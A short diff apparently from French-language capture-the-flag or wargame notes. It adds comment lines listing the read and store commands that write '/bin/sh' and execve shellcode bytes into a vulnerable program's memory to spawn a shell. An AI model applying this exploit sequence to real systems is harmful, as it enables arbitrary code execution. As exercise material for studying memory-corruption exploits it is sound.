@@ -51,7 +51,16 @@ registres et un bout de text (/bin/sh). Regarder le schema ci dessous:
 //
 //
 //
+//
+//
 //so in order:
 //var addr = *(read -9)
 //store (addr + 4*4) -11
-//store
+//store (addr + 7*4) 1
+//store (addr + 10*4) 5
+//store (1852400175) 7
+//store (6845231) 8
+//store (3791112497) 10
+//store (2160921520) 11
+//quit
+//
